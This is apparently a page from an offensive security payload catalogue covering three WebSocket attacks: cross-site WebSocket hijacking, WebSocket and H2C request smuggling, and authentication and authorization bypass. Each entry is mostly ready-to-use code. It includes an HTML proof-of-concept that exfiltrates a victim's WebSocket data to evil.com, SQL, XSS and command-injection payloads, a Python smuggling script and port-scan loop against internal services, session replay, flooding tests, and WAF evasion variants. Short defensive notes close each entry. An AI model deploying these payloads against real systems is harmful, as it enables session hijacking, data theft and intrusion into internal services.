# WebSocket Security

_3 web payloads_

### Cross-Site WebSocket Hijacking (CSWSH)  `ws-hijack`
_Exploit the lack of Origin validation during the WebSocket handshake to establish a cross-site WebSocket connection from a malicious web page. An attacker can hijack the victim's WebSocket session, steal real-time data, or send messages as the victim. Similar to CSRF but targeting the WebSocket protocol._
Subcategory: **WebSocket Hijacking** · tags: `WebSocket` `CSWSH` `Origin` `Cross-Site` `Session Hijacking`

**Prerequisites:**
- Target uses WebSocket communication
- The WebSocket handshake does not validate Origin

**Attack Chain:**

**1. Identify the WebSocket endpoint**
> Search for WebSocket endpoints and test whether they accept cross-site connections from an arbitrary Origin
```
# Search for WebSocket connections in frontend code
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"

# Inspect in browser developer tools (Console)
# Filter WS-type requests in the Network tab

# Manual connection test
websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close

# Check Origin handling in the handshake response
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Origin: https://evil.com" \
  "https://{TARGET}/ws"
```
**Syntax breakdown:**
- `wss://` — WebSocket Secure protocol prefix _keyword_
- `websocat` — WebSocket command-line client tool _command_
- `Origin: https://evil.com` — tests whether a cross-site Origin is accepted _header_
- `Sec-WebSocket-Key` — the random key required for the WebSocket handshake _header_

**2. Construct a cross-site hijacking POC page**
> Create a malicious HTML page that uses the victim's cookies to establish a WebSocket connection and steal data
```
<!-- CSWSH attack page -->
<html>
<body>
<h1>WebSocket Cross-Site Hijacking POC</h1>
<div id="output"></div>
<script>
  // Target WebSocket — the browser will automatically attach cookies
  var ws = new WebSocket("wss://{TARGET}/ws");
  
  ws.onopen = function() {
    document.getElementById("output").innerHTML += "<p>Connected!</p>";
    // Send messages as the victim
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
  };
  
  ws.onmessage = function(evt) {
    // Steal data returned by the WebSocket
    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
    // Exfiltrate to the attacker server
    fetch("https://evil.com/collect", {
      method: "POST",
      body: evt.data
    });
  };
</script>
</body>
</html>
```
**Syntax breakdown:**
- `new WebSocket("wss://{TARGET}/ws")` — the browser automatically attaches the target site's cookies _function_
- `ws.onmessage` — receives WebSocket messages — steals real-time data _keyword_
- `fetch("https://evil.com/collect")` — exfiltrates the stolen data to the attacker server _function_

**3. WebSocket message injection**
> Inject SQL/XSS/command injection payloads via WebSocket messages
```
# If the WebSocket message is spliced into a backend query
# SQL injection
ws.send(JSON.stringify({
  action: "search",
  query: "test\x27 UNION SELECT username,password FROM users--"
}));

# XSS (if the message is rendered on another user's page)
ws.send(JSON.stringify({
  action: "chat",
  message: "<img src=x onerror=alert(document.cookie)>"
}));

# Command injection
ws.send(JSON.stringify({
  action: "exec",
  target: "127.0.0.1;id"
}));
```
**Syntax breakdown:**
- `UNION SELECT username,password` — SQL union injection to extract credentials _technique_
- `<img src=x onerror=...>` — XSS payload — injected via a chat message _technique_
- `127.0.0.1;id` — command injection — semicolon-concatenated system command _technique_

**4. WebSocket traffic analysis script**
> Python script to monitor WebSocket traffic in real time and log sensitive data
```
# Python WebSocket monitoring and analysis script
import asyncio
import websockets
import json

async def monitor():
    uri = "wss://{TARGET}/ws"
    headers = {"Cookie": "{SESSION_COOKIE}"}
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # Send authentication message
        await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
        
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"[{data.get('type', 'unknown')}] {msg}")
            
            # Log sensitive data
            if 'password' in msg.lower() or 'token' in msg.lower():
                with open('ws_sensitive.log', 'a') as f:
                    f.write(msg + '\n')

asyncio.run(monitor())
```
**Syntax breakdown:**
- `websockets.connect` — Python WebSocket client library _function_
- `extra_headers` — attach Cookie/Token authentication headers _parameter_
- `ws.recv()` — asynchronously receive a WebSocket message _function_

**WAF/EDR Bypass Variants:**

**Bypassing Origin validation**
> Bypass WebSocket Origin validation via Origin spoofing, subdomains, a null Origin, and subprotocols
```
# Origin header spoofing (only effective in non-browser environments)
websocat "wss://{TARGET}/ws" -H "Origin: https://{TARGET}"

# Subdomain bypass
Origin: https://test.{TARGET}  # If validation is not strict
Origin: https://{TARGET}.evil.com  # Domain suffix confusion

# null Origin (in some browser scenarios)
# Use a data: URI or sandboxed iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>">

# Bypass using a WebSocket subprotocol
Sec-WebSocket-Protocol: graphql-ws, chat
```
**Syntax breakdown:**
- `sandbox="allow-scripts"` — a sandboxed iframe results in a null Origin _technique_
- `Sec-WebSocket-Protocol` — WebSocket subprotocol negotiation header _header_

**Overview:** Cross-Site WebSocket Hijacking (CSWSH) is a security issue unique to the WebSocket protocol. The WebSocket handshake uses an HTTP upgrade request, and the browser automatically attaches cookies. If the server does not validate the Origin header, an attacker can establish a cross-site connection to the target WebSocket server from a malicious web page and hijack the victim's session. This is equivalent to a WebSocket version of CSRF, but because WebSocket is bidirectional communication, the attacker can also receive returned data in real time.

**Vulnerability Principle:** Root causes: (1) the WebSocket handshake is an ordinary HTTP request, and the browser automatically attaches cookies (like CSRF); (2) the server does not validate whether the request's Origin header is a trusted source; (3) once the WebSocket connection is established it is not restricted by the same-origin policy; (4) CSRF tokens are usually not applied to the WebSocket handshake; (5) WebSocket messages usually do not pass through WAF detection; (6) some frameworks accept WebSocket connections from all Origins by default.

**Exploitation Method:** Attack flow: (1) search the frontend code for the WebSocket connection URL (wss://target/ws); (2) use the websocat tool to test whether a cross-site Origin is accepted; (3) if an arbitrary Origin is accepted, construct a malicious HTML page that uses new WebSocket() to connect to the target (the browser automatically attaches cookies); (4) steal all returned data in the ws.onmessage callback and exfiltrate it to the attacker server; (5) further test for injection vulnerabilities in WebSocket messages (SQL/XSS/command injection).

**Defensive Measures:** Defenses: (1) strictly validate the Origin header during the WebSocket handshake (allowlist mode); (2) use an independent WebSocket authentication token (not relying on cookies); (3) enforce CSRF token validation at the WebSocket message level; (4) perform input validation and output encoding on WebSocket message content; (5) use WSS (WebSocket Secure) for encrypted transport; (6) enforce WebSocket message rate limiting to prevent abuse.

---

### WebSocket Smuggling Attack  `ws-smuggling`
_Exploit differences in how reverse proxies/load balancers handle the WebSocket protocol to smuggle HTTP requests to internal services via WebSocket upgrade requests. An attacker can bypass frontend security controls and communicate directly with the backend, accessing protected internal APIs or management interfaces._
Subcategory: **WebSocket Smuggling** · tags: `WebSocket` `Smuggling` `Reverse Proxy` `H2C` `Internal Pivoting`

**Prerequisites:**
- Target uses a reverse proxy (Nginx/Varnish, etc.)
- The proxy allows WebSocket upgrades
- Internal services exist behind the backend

**Attack Chain:**

**1. Detect the possibility of WebSocket smuggling**
> Test whether the reverse proxy has a WebSocket/H2C smuggling vulnerability via an Upgrade request
```
# Test the Upgrade response
curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  "https://{TARGET}/"

# Test H2C smuggling (HTTP/2 Cleartext)
curl -i -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "https://{TARGET}/"

# Detect the proxy type
curl -I "https://{TARGET}/" | grep -iE "server:|via:|x-powered-by:"
```
**Syntax breakdown:**
- `Upgrade: websocket` — WebSocket protocol upgrade request _header_
- `Upgrade: h2c` — HTTP/2 cleartext protocol upgrade (H2C smuggling) _header_
- `HTTP2-Settings` — required parameter for the H2C protocol upgrade _header_

**2. Construct the WebSocket tunnel**
> After the WebSocket upgrade, send smuggled HTTP requests over the raw socket to access internal interfaces
```
# Construct WebSocket smuggling using Python
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket handshake
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # Smuggle HTTP request into the internal network
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")
```
**Syntax breakdown:**
- `Sec-WebSocket-Key` — WebSocket handshake key (Base64-encoded) _header_
- `101` — HTTP 101 Switching Protocols — upgrade succeeded _value_
- `Host: 127.0.0.1` — the smuggled request points to an internal address _header_

**3. H2C smuggling to bypass access control**
> Use the h2cSmuggler tool to smuggle access to internal services and management interfaces via an HTTP/2 upgrade
```
# h2cSmuggler tool
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://{TARGET}/admin/"

# Manual H2C smuggling — access an internal API
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://127.0.0.1:8080/api/internal/users"

# Scan internal ports
for port in 80 8080 8443 9090 3000 5000; do
  python3 h2cSmuggler.py -x "https://{TARGET}" \
    "http://127.0.0.1:$port/" 2>/dev/null && echo "Port $port: OPEN"
done
```
**Syntax breakdown:**
- `h2cSmuggler.py` — dedicated H2C smuggling tool _command_
- `-x` — specifies the proxy/target address _parameter_
- `127.0.0.1:8080` — the internal service accessed via smuggling _domain_

**4. Exploiting reverse proxy differences**
> Perform smuggling by exploiting WebSocket handling differences across reverse proxies (Nginx/Varnish/HAProxy)
```
# Nginx WebSocket smuggling
# If Nginx is configured with proxy_pass to the backend
# but does not restrict Upgrade requests

# Test reverse proxy path differences
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/..;/admin/"

# Varnish cache poisoning + WebSocket
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "X-Forwarded-Host: evil.com" \
  "https://{TARGET}/"

# HAProxy WebSocket smuggling
# Exploit HAProxy no longer checking subsequent requests after Upgrade
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/" --next -H "Host: internal" "https://{TARGET}/admin/"
```
**Syntax breakdown:**
- `/..;/admin/` — path traversal — exploits parsing differences between the proxy and backend _path_
- `X-Forwarded-Host` — request header injection — may cause cache poisoning _header_

**WAF/EDR Bypass Variants:**

**Bypassing WAF WebSocket detection**
> Bypass WAF detection of WebSocket smuggling via case obfuscation, chunked transfer, and compression extensions
```
# Case obfuscation
Connection: upgrade
Upgrade: WebSocket  # Case variant
Upgrade: WEBSOCKET

# Chunked transfer to hide the smuggled content
Transfer-Encoding: chunked
# Embed the HTTP request in a WebSocket frame

# Use a WebSocket Extension for obfuscation
Sec-WebSocket-Extensions: permessage-deflate
# A compressed malicious message is hard for a WAF to detect

# Disguise as normal WebSocket traffic
# Send normal messages first, then send the smuggled request after a delay
```
**Syntax breakdown:**
- `permessage-deflate` — WebSocket message compression extension — obfuscates the payload _keyword_
- `Transfer-Encoding: chunked` — chunked transfer encoding hides the smuggled content _header_

**Overview:** WebSocket smuggling is an advanced attack technique that exploits differences in how reverse proxies handle WebSocket upgrades. When a proxy (such as Nginx/HAProxy/Varnish) receives a WebSocket upgrade request, it establishes a TCP tunnel, after which the proxy no longer inspects the data transmitted through the tunnel. An attacker can send arbitrary HTTP requests within the WebSocket tunnel, bypassing the frontend proxy's access control to communicate directly with the backend and access internal APIs and management interfaces that should be restricted.

**Vulnerability Principle:** Root causes: (1) after handling 101 Switching Protocols, the reverse proxy treats the connection as a raw TCP tunnel and no longer performs HTTP-layer inspection; (2) the proxy's validation of the WebSocket Upgrade request is not strict enough (it may not verify whether the backend actually completed a 101 response); (3) H2C (HTTP/2 Cleartext) upgrade smuggling — some proxies also create an unmonitored tunnel when handling an h2c upgrade; (4) the proxy and backend parse the same request inconsistently (path, Host header, etc.); (5) the backend assumes all requests pass through the frontend proxy's security filtering.

**Exploitation Method:** Attack path: (1) detect whether the target is behind a reverse proxy (Server/Via headers, response characteristics); (2) send a WebSocket Upgrade request and observe the proxy behavior (whether it returns 101); (3) if the proxy allows the upgrade but the backend is not a true WebSocket service, the tunnel can be used to send HTTP requests; (4) send HTTP requests pointing to 127.0.0.1/internal IPs within the established tunnel; (5) scan internal ports and services; (6) access internal management interfaces and restricted APIs; (7) for H2C smuggling, use the h2cSmuggler tool for automated testing.

**Defensive Measures:** Defenses: (1) the reverse proxy establishes a tunnel only when the backend confirms a 101 response; (2) prohibit Upgrade requests to non-WebSocket backends; (3) configure a WebSocket endpoint allowlist at the proxy layer (only allow upgrades for specific paths); (4) disable H2C (http2_push_preload off in Nginx); (5) the backend service must also enforce access control and not assume all requests pass through the proxy; (6) use Network Policy/Security Groups to restrict the internal range accessible to the backend.

---

### WebSocket Authentication and Authorization Bypass  `ws-auth-bypass`
_Exploit the lack of continuous authentication checks after a WebSocket connection is established, bypassing authentication and authorization mechanisms via session fixation, token replay, unauthorized channel subscription, and so on. The persistent-connection nature of WebSocket means an existing connection can retain access even after a privilege change._
Subcategory: **Authentication Bypass** · tags: `WebSocket` `Authentication` `Authorization` `Broken Access Control` `Token Replay`

**Prerequisites:**
- Target uses WebSocket real-time communication
- A valid session/token has been obtained

**Attack Chain:**

**1. Analyze the WebSocket authentication mechanism**
> Intercept and analyze the authentication flow by monkey-patching the WebSocket object
```
# Capture the WebSocket handshake and initial messages
# In the browser Console:
const origWS = WebSocket;
window.WebSocket = function(url, protocols) {
  console.log("[WS] Connecting to:", url);
  const ws = new origWS(url, protocols);
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("[WS] SEND:", data);
    origSend(data);
  };
  ws.addEventListener("message", e => console.log("[WS] RECV:", e.data));
  return ws;
};

# Observe the authentication flow:
# 1. Is the Cookie/Token passed during the handshake?
# 2. Is an auth message sent after connecting?
# 3. Is there a heartbeat keep-alive mechanism?
```
**Syntax breakdown:**
- `window.WebSocket = function` — monkey-patch the WebSocket constructor _function_
- `ws.send = function` — intercept sent messages for analysis _function_
- `addEventListener("message")` — listen for received messages _function_

**2. Token replay and session fixation**
> Test replay after token expiration and whether the WebSocket connection remains active after logout
```
# Test whether the token can still be used after expiration
# Step 1: record a valid token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: wait for the token to expire / log out of the account
# Step 3: try to establish a WebSocket connection with the old token
websocat "wss://{TARGET}/ws" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -5

# Test whether the WebSocket connection remains active after the user logs out
# (a WebSocket persistent connection may not be affected by HTTP session logout)

# Session fixation — use someone else's token
websocat "wss://{TARGET}/ws" \
  -H "Cookie: session={OTHER_USER_SESSION}"
```
**Syntax breakdown:**
- `Authorization: Bearer` — JWT authentication during the WebSocket handshake _header_
- `{OTHER_USER_SESSION}` — test whether another user's session cookie can be replayed _variable_

**3. Unauthorized channel/room subscription**
> Test the authorization control of WebSocket channels/rooms, attempting to subscribe to another user's private channel without authorization
```
# Subscribe to another user's private channel
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "user.1002.notifications"  // Try subscribing to another user
}));

# Subscribe to the admin channel
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "admin.dashboard"
}));

# Iterate over channel IDs
for (let i = 1; i <= 100; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user.${i}.messages`
  }));
}

# Test channel name injection
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "public.*"  // Wildcard subscription
}));
```
**Syntax breakdown:**
- `user.1002.notifications` — another user's private channel — test broken access control _value_
- `admin.dashboard` — admin channel — test vertical privilege escalation _value_
- `public.*` — wildcard subscription — attempt to receive messages in bulk _technique_

**4. WebSocket rate limit and DoS testing**
> Test the WebSocket message rate limit and size limit
```
# Test the message rate limit
import asyncio, websockets, json, time

async def rate_test():
    uri = "wss://{TARGET}/ws"
    async with websockets.connect(uri) as ws:
        # Rapidly send messages to test the rate limit
        start = time.time()
        for i in range(1000):
            await ws.send(json.dumps({"action": "ping", "seq": i}))
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        
        # Large message test
        large_msg = "A" * (1024 * 1024)  # 1MB
        try:
            await ws.send(large_msg)
            print("Large message accepted - no size limit!")
        except Exception as e:
            print(f"Large message rejected: {e}")

asyncio.run(rate_test())
```
**Syntax breakdown:**
- `range(1000)` — rapidly send 1000 messages to test the rate limit _value_
- `"A" * (1024 * 1024)` — 1MB large message to test the size limit _value_

**WAF/EDR Bypass Variants:**

**Bypassing the WebSocket authentication mechanism**
> Bypass WebSocket authentication via protocol downgrade, reconnection mechanisms, and polling fallback
```
# Use a low-privilege token to obtain a high-privilege WebSocket connection
# Some implementations only validate the token during the handshake and no longer check after connecting

# Exploit the WebSocket reconnection mechanism
# Some client implementations automatically reconnect after a disconnect
# Intercept the reconnection request and replace the token

# Protocol downgrade attack
# Downgrade from wss:// to ws:// (if the backend supports it)
websocat "ws://{TARGET}/ws" -H "Cookie: session={TOKEN}"

# Exploit Socket.io/SockJS HTTP fallback
curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
```
**Syntax breakdown:**
- `ws://` — unencrypted WebSocket — may bypass TLS-layer security checks _keyword_
- `transport=polling` — Socket.io HTTP long-polling fallback _parameter_

**Overview:** WebSocket authentication and authorization bypass is a common but easily overlooked security issue in real-time communication applications. Unlike HTTP requests, a WebSocket is a persistent connection once established, and many applications only verify identity during the handshake and no longer check for privilege changes afterward. This leads to: (1) the WebSocket connection remaining active after the user logs out; (2) communication still being possible after the token expires; (3) channel subscriptions lacking authorization checks. Scenarios such as chat applications, real-time collaboration tools, and financial market data pushes are especially high-risk.

**Vulnerability Principle:** Root causes: (1) WebSocket authenticates only once during the handshake and does not validate privilege changes afterward; (2) after a user logs out/changes their password, an established WebSocket connection is not proactively disconnected; (3) the channel/room subscription operation lacks a server-side authorization check; (4) WebSocket messages lack a signature or anti-tampering mechanism; (5) rate limiting is usually applied only at the HTTP layer, and WebSocket messages are unrestricted; (6) the HTTP polling fallback mode of frameworks such as Socket.io may bypass WebSocket-layer security controls.

**Exploitation Method:** Attack flow: (1) use browser developer tools to analyze the WebSocket authentication flow (Cookie or Token); (2) test whether the WebSocket connection remains valid after the token expires/logout; (3) attempt to subscribe to another user's private channel (IDOR); (4) attempt to subscribe to the admin channel (vertical privilege escalation); (5) test injection points in WebSocket messages (SQL/XSS); (6) check whether a rate limit exists — no limit may lead to DoS or bulk data scraping.

**Defensive Measures:** Defenses: (1) enforce continuous authentication at the WebSocket message level (periodically validate token validity); (2) proactively close all WebSocket connections when a user logs out/privileges change; (3) enforce a server-side authorization check on channel subscriptions (verify channel ownership); (4) set WebSocket message rate limits and size limits; (5) use short-lived JWTs (15 minutes) and implement token refresh at the WebSocket layer; (6) audit input validation in all WebSocket event handlers.

---
